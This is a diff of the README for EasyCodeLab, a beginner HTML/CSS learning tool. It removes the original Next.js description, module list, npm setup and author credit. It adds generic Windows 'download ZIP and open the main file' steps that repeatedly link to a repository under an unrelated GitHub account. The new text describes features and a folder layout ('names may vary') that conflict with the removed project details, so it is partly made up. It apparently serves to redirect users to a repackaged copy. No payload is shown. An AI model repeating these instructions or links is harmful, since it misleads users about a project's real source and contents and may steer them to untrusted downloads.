@@ -1,89 +1,173 @@
-# EasyCodeLab 
+# 🎯 Easy-Code-Lab - Learn Web Basics by Doing
 
-An interactive, browser-based learning tool that helps complete beginners build mental models around HTML and CSS through visual, hands-on exercises.
+[![Download Easy-Code-Lab](https://img.shields.io/badge/Download-Easy--Code--Lab-blue.svg?style=for-the-badge)](https://github.com/myristicagenuspolygonum773/Easy-Code-Lab)
 
-Built for students fresh out of high school who have never written a line of code. No prior knowledge required.
+## 🧭 What is Easy-Code-Lab?
 
-## Modules
+Easy-Code-Lab is a browser-based learning tool for complete beginners. It helps you learn HTML, CSS, and JavaScript by using simple, visual exercises. You do not need coding experience to start.
 
-### Tag Builder
+It is built for students who want a clear path into web basics. You can open it in your browser and learn by clicking, editing, and watching results change right away.
 
-Learn HTML and CSS syntax by building tags piece by piece. Fill in the blanks, see your tags visualized as colorful nested boxes, and watch a live preview update as you type.
+## 💻 What you need
 
-- 9 progressive lessons covering HTML tags, nesting, attributes, links, images, lists, and CSS basics
-- Gap-fill exercises for guided learning
-- Free-edit coding with live preview
-- Real-time tag tree visualization
+To run Easy-Code-Lab on Windows, you need:
 
-### Box Model Explorer
+- A Windows PC with internet access
+- A modern browser like Chrome, Edge, or Firefox
+- A few hundred MB of free disk space
+- A screen size that lets you see the exercise area clearly
+- A mouse or trackpad for easy use
 
-Understand the CSS box model through interactive 3D visualization. Adjust padding, margin, and border with sliders and see changes in real time.
+For the best experience, use the latest version of your browser.
 
-- 6 lessons from content box to combined layouts
-- Interactive 3D view powered by Three.js
-- 2D Chrome DevTools-style overlay
-- "Match the target" challenges
+## 📥 Download and run on Windows
 
-## Tech Stack
+Use this link to visit the download page:
 
-- **Next.js 16** — App Router, static generation
-- **React 19** — `useDeferredValue`, `startTransition` for responsive typing
-- **Three.js** — 3D box model visualization via `@react-three/fiber` + `@react-three/drei`
-- **CodeMirror 6** — Code editor with syntax highlighting
-- **Motion** — UI animations and transitions
-- **IndexedDB** — Persistent progress storage (no backend required)
-- **Tailwind CSS v4** — Custom color theme with playful design tokens
+[Visit the Easy-Code-Lab download page](https://github.com/myristicagenuspolygonum773/Easy-Code-Lab)
 
-## Getting Started
+### Steps
 
-```bash
-# Install dependencies
-npm install
+1. Open the link above in your browser.
+2. On the GitHub page, look for the green **Code** button.
+3. Click **Code** and choose **Download ZIP**.
+4. Save the file to a folder you can find, like **Downloads** or **Desktop**.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+7. Find the main file for the app, such as **index.html** or a similar start file.
+8. Double-click that file to open Easy-Code-Lab in your browser.
 
-# Start the dev server
-npm run dev
-```
+If Windows asks which app to use, choose your browser.
 
-Open [http://localhost:3000](http://localhost:3000) to start learning.
+## 🖱️ How to use it
 
-## Project Structure
+Easy-Code-Lab is made for hands-on learning. Most tasks follow the same pattern:
 
-```text
-src/
-├── app/                    # Next.js App Router pages
-│   └── (modules)/          # Tag Builder & Box Model routes
-├── components/
-│   ├── editor/             # CodeEditor, GapFillEditor, HtmlPreview
-│   ├── tag-builder/        # TagVisualizer, TagBuilderLesson
-│   ├── box-model/          # 3D canvas, 2D overlay, controls
-│   ├── layout/             # Header, LessonStepper, InstructionPanel
-│   └── ui/                 # Button, Slider, Card, etc.
-├── content/                # Lesson definitions (typed TypeScript)
-├── hooks/                  # useLessonProgress, useCodeValidation, useIndexedDB
-├── lib/                    # HTML parser, tag validator, lesson engine
-├── stores/                 # Zustand stores
-└── types/                  # TypeScript type definitions
-```
+1. Read the short instruction on the screen.
+2. Look at the example or layout.
+3. Type or change code in the editor area.
+4. Watch the preview update.
+5. Try again until the result matches the task.
 
-## AGENTS.md
-see 👉[build](https://github.com/mwakidenis/Easy-Code-Lab/blob/main/AGENTS.md)
+You do not need to memorize code before you start. The tool is built to help you learn one step at a time.
 
+## 📚 What you can learn
 
-## Project Admin ⚡
+Easy-Code-Lab focuses on the core parts of web pages:
 
-<table align="center">
-  <tr>
-    <td align="center">
-        <img src="https://res.cloudinary.com/dqv8dlj2s/image/upload/v1772276752/IMG_20251220_111730_cqlgfo.jpg" width="750" height="250" />
-      </a>
-      <h4>mwakidenis</h4>
-    </td>
-  </tr>
-</table>
+- **HTML** to build page structure
+- **CSS** to change colors, spacing, and layout
+- **JavaScript** to add simple action and response
+- Basic page elements like headings, paragraphs, buttons, and images
+- Simple visual feedback so you can see what each change does
 
-<div><h2><img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Smilies/Red%20Heart.png" width="35" height="35"> Contributors</h2></div>
+The lessons aim to build a mental model of how web pages work. This helps you understand not just what to type, but why it works.
 
-I extend my heartfelt gratitude for any invaluable contribution to this project! Your efforts play a pivotal role in elevating the repo to greater heights.
+## 🧩 Main parts of the app
 
-<p align="right"><a href="#top"><img src="https://img.shields.io/badge/Move%20to%20top-Blue?style=plastic" alt="Back To Top"></a></p>
+### 🏗️ HTML exercises
 
+Learn how page content is put together. You can practice with headings, text, links, lists, and simple page blocks.
+
+### 🎨 CSS exercises
+
+Learn how to style content. You can change font sizes, colors, borders, spacing, and alignment.
+
+### ⚙️ JavaScript exercises
+
+Learn how basic logic works. You can use simple scripts to make buttons respond, show messages, and update parts of the page.
+
+### 👀 Live preview
+
+See your changes right away in the browser. This helps you connect each edit to the result on screen.
+
+### 🧠 Guided practice
+
+Each exercise gives you a clear goal. You can follow the steps without needing outside help.
+
+## 🪟 Typical Windows setup
+
+If you want a smooth start on Windows, use this setup:
+
+- Open the ZIP file with File Explorer
+- Extract it to a folder with a short path, such as `C:\Easy-Code-Lab`
+- Keep the app files together in one folder
+- Open the main HTML file in your browser
+- Bookmark the folder so you can return later
+
+This setup keeps the files easy to find and makes it simple to reopen the app.
+
+## 🔧 Common issues and fixes
+
+### The file does not open
+
+- Check that you extracted the ZIP file first
+- Make sure you are opening the main HTML file, not the ZIP file
+- Try another browser if the first one does not work
+
+### The page looks broken
+
+- Refresh the browser
+- Make sure all files stayed in the same folder
+- Open the file again from the extracted folder
+
+### Nothing happens when I click a lesson
+
+- Turn off extensions that block scripts
+- Use a current browser
+- Reload the page and try again
+
+### Text looks too small
+
+- Use your browser zoom controls
+- Press `Ctrl` and `+` to zoom in
+- Press `Ctrl` and `-` to zoom out
+
+## 🧪 Good first steps
+
+If you are new to coding, start here:
+
+1. Open the HTML lesson.
+2. Change one line.
+3. Read the result on the screen.
+4. Move to CSS and change a color.
+5. Try one JavaScript action after that.
+
+Small changes help you see the link between code and output.
+
+## 📁 Folder layout
+
+After you extract the download, you may see a structure like this:
+
+- `index.html` — main entry file
+- `assets/` — images and shared files
+- `styles/` — CSS files
+- `scripts/` — JavaScript files
+- `lessons/` — learning content and practice steps
+
+The names may vary, but the idea stays the same: keep the files together and open the main page in your browser.
+
+## 🧑‍🎓 Who it is for
+
+Easy-Code-Lab fits:
+
+- Students who have never coded before
+- Beginners who want a simple first step
+- Learners who prefer visual practice
+- Anyone who wants to understand web pages before building them
+
+It keeps the focus on clear practice instead of long lessons.
+
+## 🔗 Download again
+
+Use the link below any time you need to visit the download page:
+
+[https://github.com/myristicagenuspolygonum773/Easy-Code-Lab](https://github.com/myristicagenuspolygonum773/Easy-Code-Lab)
+
+## 🧭 Short setup path
+
+1. Visit the link.
+2. Download the ZIP file.
+3. Extract it on Windows.
+4. Open the main HTML file in your browser.
+5. Start the first lesson
